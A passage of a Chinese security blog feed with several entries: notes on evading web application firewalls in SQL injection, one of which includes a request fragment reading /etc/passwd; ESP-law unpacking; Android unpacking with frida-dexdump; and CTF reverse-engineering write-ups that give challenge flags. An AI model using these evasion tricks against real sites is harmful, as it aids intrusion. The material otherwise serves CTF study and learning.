/sql.php?a=/manage/&amp;b=…/etc/passwd 绕过防御规则</p><h1 id="爬虫白名单"><a class="markdownIt-Anchor" href="#爬虫白名单">#</a> 爬虫白名单</h1><p>通过伪造各大搜索引擎的请求头来绕过 waf</p><p>部分 waf 有提供爬虫白名单（各大浏览器的爬虫）的功能，识别爬虫的技术一般有两种:<br>1、根据 useragent<br>2、通过行为来判断<br> UserAgent 可以很容易欺骗，我们可以伪装成爬虫尝试绕过。User Agent switcher (Firefox 附加组件)，下载地址:<br><a href="https://addons.mozilla.org/en-us/firefox/addon/user-agent-switcher/">https://addons.mozilla.org/en-us/firefox/addon/user-agent-switcher/</a></p><h1 id="数据替换"><a class="markdownIt-Anchor" href="#数据替换">#</a> 数据替换</h1><p>大小写，加解密，编码，等价函数，特殊符号，反序列化，注释符混用</p><h1 id="其他"><a class="markdownIt-Anchor" href="#其他">#</a> 其他</h1><h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz">#</a> Fuzz</h2><h2 id="垃圾数据溢出"><a class="markdownIt-Anchor" href="#垃圾数据溢出">#</a> 垃圾数据溢出</h2><h2 id="http参数污染"><a class="markdownIt-Anchor" href="#http参数污染">#</a> http 参数污染</h2><p>如果出现多个相同参数，不同的服务器搭建网站会出现参数接受的差别，从而令原有的参数失效</p><table><thead><tr><th style="text-align:center">web 服务器</th><th style="text-align:center">参数获取函数</th><th style="text-align:center">获取到的参数</th></tr></thead><tbody><tr><td style="text-align:center">PHP/Apache</td><td style="text-align:center">$_GET(“par”)</td><td style="text-align:center">last</td></tr><tr><td style="text-align:center">JSP/Tomcat</td><td style="text-align:center">Request.getParameter(“par”)</td><td style="text-align:center">first</td></tr><tr><td style="text-align:center">Perl(CGI)/Apache</td><td style="text-align:center">Param(“par”)</td><td style="text-align:center">first</td></tr><tr><td style="text-align:center">Python/Apache</td><td style="text-align:center">Getvalue(“par”)</td><td style="text-align:center">all(list)</td></tr><tr><td style="text-align:center">ASP/IIS</td><td style="text-align:center">Request.QueryString(“par”)</td><td style="text-align:center">all</td></tr></tbody></table><h2 id="数据库特性"><a class="markdownIt-Anchor" href="#数据库特性">#</a> 数据库特性</h2>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ESP定律——脱壳</title>
      <link href="/2022/09/01/ESP%E5%AE%9A%E5%BE%8B%E2%80%94%E2%80%94%E8%84%B1%E5%A3%B3/"/>
      <url>/2022/09/01/ESP%E5%AE%9A%E5%BE%8B%E2%80%94%E2%80%94%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="oep"><a class="markdownIt-Anchor" href="#oep">#</a> OEP</h1><p>OEP 是程序的入口点，软件加了壳就是隐藏了 OEP 或是用了假的 OEP，以达到保护程序的目的，只要我们可以找到程序的真正的 OEP 就可以脱壳，pushad（压栈）是代表程序的入口点，popad（出栈）代表程序的出口点，与 pushad 相对应，找到 popad，oep 一般就在这附近</p><h1 id="esp定律步骤"><a class="markdownIt-Anchor" href="#esp定律步骤">#</a> ESP 定律步骤</h1><p>1、首先 F8（一般刚进去的时候会在 pushad 附近），然后观察右上角寄存器中 ESP 有没有突变成红色，如果变成红色就进行接下来的步骤</p><p>2、在底下的命令行输入指令 dd XXXXXXX 或 hr XXXXXXX (即当前 ESP 的地址)，然后回车（也可以直接右键跟随）</p><p>3、选中刚刚下断点的地址，右键选择断点 ——&gt; 硬件访问 ——&gt;word 断点，英文 breakpoint——&gt;hardware,on access——&gt;word</p><p>4、F9 运行到跳转出，F8 到达程序 OEP</p><p>5、用自带插件 olly dump 保存文件</p><h1 id="注意事项"><a class="markdownIt-Anchor" href="#注意事项">#</a> 注意事项</h1><p>我在用 esp 定律脱壳的时候，第一次用 OD 是可以正常脱壳的，但后面不知道为什么，一直会弹出一个 “无法读取被调用程序的内存” 的提示，无法脱壳，然后我在网上找了很多方法，也有很多我还不理解的，但有一个比较方便的方法是可以用的，就是用虚拟机，用 windows xp 的虚拟机运行 OD 就可以正常脱壳了，不过在本机上为什么不能脱壳，我还不知道是什么原因，欢迎大佬指点</p><h1 id="其他脱壳方法"><a class="markdownIt-Anchor" href="#其他脱壳方法">#</a> 其他脱壳方法</h1><p>ESP 定律脱壳只是手动脱壳其中一个方法，想更深层次理解 ESP 定律或学习其他方法可以看这个博客：<a href="https://blog.csdn.net/linlibest/article/details/8915614">ESP 定理如何判断找出 OEP 【OEP 脱壳的 5 种方法】</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2022</title>
      <link href="/2022/08/11/NepCTF2022/"/>
      <url>/2022/08/11/NepCTF2022/</url>
      
        <content type="html"><![CDATA[<h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse">#</a> Reverse</h1><h2 id="快来签到"><a class="markdownIt-Anchor" href="#快来签到">#</a> 快来签到</h2><p>打开 ida 之后报错，提示 The graph is too big，我们在 general 里面把 Max number of nodes 改成 999999 就就可以看到了</p><img src="/2022/08/11/NepCTF2022/1.jpg" class><p><strong>NepCTF{welc0me_t0_nepctf}</strong></p><h2 id="we_can_go"><a class="markdownIt-Anchor" href="#we_can_go">#</a> We_can_go</h2><p>直接看关键函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_719630</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+Ch] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+10h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">32</span>]; <span class="comment">// [esp+20h] [ebp-44h] BYREF</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">2</span>]; <span class="comment">// [esp+44h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">2</span>]; <span class="comment">// [esp+4Ch] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">2</span>]; <span class="comment">// [esp+54h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">2</span>]; <span class="comment">// [esp+5Ch] [ebp-8h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+64h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;retaddr &lt;= *(*NtCurrentTeb()-&gt;NtTib.ArbitraryUserPointer + <span class="number">8</span>) )</span><br><span class="line">    sub_6D82C0();</span><br><span class="line">  sub_68AC70(&amp;unk_7233C0);</span><br><span class="line">  v6 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *v2 = <span class="number">0</span>;</span><br><span class="line">  v10[<span class="number">0</span>] = &amp;unk_7200A0;</span><br><span class="line">  v10[<span class="number">1</span>] = v2;</span><br><span class="line">  sub_713D80(&amp;off_7525B8, dword_7CB200, v10, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  sub_6C79B0(v5, *v6, v6[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="string">&#x27;\x17&#x27;</span></span><br><span class="line">    &amp;&amp; *v3 == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">    &amp;&amp; v3[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; v3[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span></span><br><span class="line">    &amp;&amp; v3[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    &amp;&amp; v3[<span class="number">4</span>] == <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    &amp;&amp; v3[<span class="number">5</span>] == <span class="string">&#x27;F&#x27;</span></span><br><span class="line">    &amp;&amp; v3[<span class="number">6</span>] == <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    &amp;&amp; v3[<span class="number">22</span>] == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= dword_7CB6E4 )</span><br><span class="line">        sub_6D9750();</span><br><span class="line">      <span class="keyword">if</span> ( i + <span class="number">7</span> &gt;= <span class="string">&#x27;\x17&#x27;</span> )</span><br><span class="line">        sub_6D9750();</span><br><span class="line">      <span class="keyword">if</span> ( v3[i + <span class="number">7</span>] != *(dword_7CB6E0 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        v8[<span class="number">0</span>] = &amp;unk_7233C0;</span><br><span class="line">        v8[<span class="number">1</span>] = &amp;off_752334;</span><br><span class="line">        <span class="keyword">return</span> sub_70D8C0(&amp;off_7525CC, dword_7CB204, v8, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v7[<span class="number">0</span>] = &amp;unk_7233C0;</span><br><span class="line">    v7[<span class="number">1</span>] = &amp;off_75233C;</span><br><span class="line">    result = sub_70D8C0(&amp;off_7525CC, dword_7CB204, v7, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9[<span class="number">0</span>] = &amp;unk_7233C0;</span><br><span class="line">    v9[<span class="number">1</span>] = &amp;off_752334;</span><br><span class="line">    result = sub_70D8C0(&amp;off_7525CC, dword_7CB204, v9, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>42 行的判断是关键语句，dword_7CB6E0 就是我们需要的数据，在这里下一个断点，动调一下就可以看到</p><img src="/2022/08/11/NepCTF2022/2.jpg" class><p><strong>NepCTF{U9eT_t0_th3TRUE}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何脱bang壳</title>
      <link href="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/"/>
      <url>/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<p>今天遇到一个加了壳的安卓题，<a href="https://buuoj.cn/challenges">[网鼎杯 2020 青龙组] bang</a>，这是我第一次遇见加壳的 apk 程序，加了 bang 这个壳，第一次去这种壳所以记录一下，以免以后忘记</p><p>这里首先使用 PKID 这个工具来查壳，在网上可以搜到，然后就可以看到</p><img src="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/1.png" class><p>然后就要用到<a href="https://github.com/hluwa/FRIDA-DEXDump"> frida-dexdeump 脚本</a>来脱壳，在使用这个脚本之前，还要在连接安卓系统的条件下使用，在这里还要配置一下 frida 的环境</p><h3 id="第一步在windows下安装frida模块和frida-tools模块"><a class="markdownIt-Anchor" href="#第一步在windows下安装frida模块和frida-tools模块">#</a> 第一步，在 windows 下安装 frida 模块和 frida-tools 模块</h3><p>先安装 frida 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br></pre></td></tr></table></figure><p>然后安装 frida-tools 模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><p><strong>在安装完之后，要将他们所在的路径添加到环境变量中，否则无法使用 frida 指令</strong></p><h3 id="第二步安卓系统下安装frida-server"><a class="markdownIt-Anchor" href="#第二步安卓系统下安装frida-server">#</a> 第二步，安卓系统下安装 frida-server</h3><p>要与安卓系统进行连接，首先要在安卓系统中安装<a href="https://github.com/frida/frida/releases"> frida-server</a>，可以看到这里有很多版本</p><img src="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/2.png" class><p>我们要选择与我们刚才在 windows 下 pip 安装的 frida 相对应的版本进行安装，同时还要看你所使用的安卓系统的架构，比如我安装的 frida 是 15.2.2 版本的，而且我用的安卓系统是 64 位的，那我就选择 frida-server-15.2.2-android-x86_64.xz，然后我们就要把它安装进安卓系统中</p><h4 id="连接安卓系统"><a class="markdownIt-Anchor" href="#连接安卓系统">#</a> 连接安卓系统</h4><p>连接安卓系统需要用到<a href="https://dl.google.com/android/repository/platform-tools_r33.0.2-windows.zip"> adb 指令</a>，下载解压之后将其路径添加到环境变量中就可以使用了，然后打开 cmd，输入下面的命令进行传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push (frida-server在windows中的路径) /data/local/tmp(这个是安卓系统的目标路径)</span><br></pre></td></tr></table></figure><p>输入完之后可能要等个一两分钟才传输完成，完成之后就可以进行连接了，我用的安卓系统是 mumu 模拟器的，可以在模拟器里面看自己的地址，输入以下命令连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:7555</span><br></pre></td></tr></table></figure><img src="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/4.png" class><p>连接成功</p><p>然后通过以下命令进入 frida-server 所在目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br></pre></td></tr></table></figure><p>先给文件权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 frida-server-15.2.2(文件名)</span><br></pre></td></tr></table></figure><p>再打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-15.2.2</span><br></pre></td></tr></table></figure><p>然后我们再打开一个新的 cmd 输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>以此来确认该程序有没有打开成功</p><img src="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/3.png" class><p>这就说明打开成功了</p><h3 id="第三步脚本脱壳"><a class="markdownIt-Anchor" href="#第三步脚本脱壳">#</a> 第三步，脚本脱壳</h3><p>在安卓端打开 frida-server 之后，我们再在安卓端把要脱壳的程序给打开，就可以在 windows 下进行脱壳了，我们在刚刚下好的 frida-dexdump 目录下打开 cmd，输入下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-dexdump -FU</span><br></pre></td></tr></table></figure><img src="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/5.png" class><p>然后在此目录下会出现一个跟被脱壳程序同名的文件，里面有两个</p><img src="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/6.png" class><p>把第一个文件拿到 jeb 中打开，可以直接看到 flag</p><img src="/2022/08/07/%E5%A6%82%E4%BD%95%E8%84%B1bang%E5%A3%B3/7.png" class><p>得到<strong> flag {borring_things}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022-7月-隐秘的角落</title>
      <link href="/2022/07/31/DASCTF2022-7%E6%9C%88-%E9%9A%90%E8%97%8F%E7%9A%84%E8%A7%92%E8%90%BD/"/>
      <url>/2022/07/31/DASCTF2022-7%E6%9C%88-%E9%9A%90%E8%97%8F%E7%9A%84%E8%A7%92%E8%90%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="主函数"><a class="markdownIt-Anchor" href="#主函数">#</a> 主函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">main_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edi</span></span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// r9</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  __int64 v8; <span class="comment">// r9</span></span><br><span class="line">  __int64 v9; <span class="comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// er9</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// edx</span></span><br><span class="line">  __int64 v14; <span class="comment">// r8</span></span><br><span class="line">  __int64 v15; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v18; <span class="comment">// r8</span></span><br><span class="line">  __int128 v19; <span class="comment">// [rsp+58h] [rbp-38h] BYREF</span></span><br><span class="line">  __int128 v20; <span class="comment">// [rsp+68h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v21; <span class="comment">// [rsp+78h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> **v22; <span class="comment">// [rsp+80h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( &amp;v22 &lt;= *(__readfsqword(<span class="number">0xFFFFFFF8</span>) + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  sync___WaitGroup__Add(v1, v2, v0);</span><br><span class="line">  runtime_newobject(v1, v2, v3, v4, v5, v6);</span><br><span class="line">  v21 = &amp;unk_4B0DA0;</span><br><span class="line">  v22 = &amp;off_4E9BB0;</span><br><span class="line">  fmt_Fprintln(v1, v2, &amp;v21, &amp;unk_4B0DA0, v7, v8, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v21);</span><br><span class="line">  *&amp;v20 = &amp;unk_4AE9C0;</span><br><span class="line">  *(&amp;v20 + <span class="number">1</span>) = <span class="number">1LL</span>;</span><br><span class="line">  fmt_Fscanf(</span><br><span class="line">    v1,</span><br><span class="line">    v2,</span><br><span class="line">    &amp;go_itab__os_File_io_Reader,</span><br><span class="line">    &amp;v20,</span><br><span class="line">    v9,</span><br><span class="line">    v10,</span><br><span class="line">    &amp;go_itab__os_File_io_Reader,</span><br><span class="line">    os_Stdin,</span><br><span class="line">    &amp;unk_4C9DA5,</span><br><span class="line">    <span class="number">2LL</span>,</span><br><span class="line">    &amp;v20,</span><br><span class="line">    <span class="number">1LL</span>);</span><br><span class="line">  runtime_newproc(v1, v2, &amp;off_4D2310, MEMORY[<span class="number">1</span>], v11, v12, <span class="number">16</span>, &amp;off_4D2310, MEMORY[<span class="number">1</span>], MEMORY[<span class="number">9</span>]);</span><br><span class="line">  *&amp;v19 = &amp;unk_4B0DA0;</span><br><span class="line">  *(&amp;v19 + <span class="number">1</span>) = &amp;off_4E9BC0;</span><br><span class="line">  fmt_Fprintln(v1, v2, v13, &amp;go_itab__os_File_io_Writer, v14, v15, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v19);</span><br><span class="line">  sync___WaitGroup__Wait(v1, v2, v16, v17, v18);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 runtime_newproc 函数代表启动了另一个线程来执行函数，交叉引用可以发现引用的是 main_checkflag 函数，后面的数组比如 &amp; off_4E9BC0 就是提示语，在 linux 中打开之后输入 flag 会提示’Who am I? where am I? what am I doing?’，不过我们先不用管这个，先看关键函数</p><h1 id="main_checkflag"><a class="markdownIt-Anchor" href="#main_checkflag">#</a> main_checkflag</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main_checkflag</span><span class="params">(<span class="type">int</span> a1, __int64 a2, <span class="type">int</span> a3, __int64 a4, <span class="type">int</span> a5, <span class="type">int</span> a6, __int64 a7, __int64 a8)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v9; <span class="comment">// r8</span></span><br><span class="line">  __int64 v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// al</span></span><br><span class="line">  __int64 v13; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+18h] [rbp-70h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+20h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+28h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-48h] BYREF</span></span><br><span class="line">  __int128 v19; <span class="comment">// [rsp+60h] [rbp-28h] BYREF</span></span><br><span class="line">  __int128 v20; <span class="comment">// [rsp+70h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+80h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0xFFFFFFF8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v21 &lt;= *(v8 + <span class="number">16</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  runtime_stringtoslicebyte(a1, a2, a3, v8, a5, a6, v18, a7, a8);</span><br><span class="line">  main_Myencode(a1, a2, v17, v16);</span><br><span class="line">  v11 = v15;</span><br><span class="line">  <span class="keyword">if</span> ( v16 == qword_55EA78 )</span><br><span class="line">  &#123;</span><br><span class="line">    runtime_memequal(a1, a2, v15, main_enc, v9, v10);</span><br><span class="line">    v12 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    *&amp;v20 = &amp;unk_4B0DA0;</span><br><span class="line">    *(&amp;v20 + <span class="number">1</span>) = &amp;off_4E9B90;</span><br><span class="line">    fmt_Fprintln(a1, a2, v11, &amp;go_itab__os_File_io_Writer, v9, v10, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v20);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *&amp;v19 = &amp;unk_4B0DA0;</span><br><span class="line">    *(&amp;v19 + <span class="number">1</span>) = &amp;off_4E9BA0;</span><br><span class="line">    fmt_Fprintln(a1, a2, v11, &amp;go_itab__os_File_io_Writer, v9, v10, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v19);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sync___WaitGroup__Add(a1, a2, v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数出现了一个 main_Myencode，看名字就觉得是个关键函数，再看后面也有一个类似刚才的数组，然后我们点进去看，发现一个关键信息</p><img src="/2022/07/31/DASCTF2022-7%E6%9C%88-%E9%9A%90%E8%97%8F%E7%9A%84%E8%A7%92%E8%90%BD/1.jpg" class><p>说明 flag 是我们输入的字符串的 md5 值，现在看 main_Myencode 函数</p><h1 id="main_myencode"><a class="markdownIt-Anchor" href="#main_myencode">#</a> main_Myencode</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main_Myencode</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, _DWORD a4, <span class="type">int</span> a5, <span class="type">int</span> a6, __int64 a7, __int64 a8, <span class="type">int</span> a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// er9</span></span><br><span class="line">  __int64 v12; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// er9</span></span><br><span class="line">  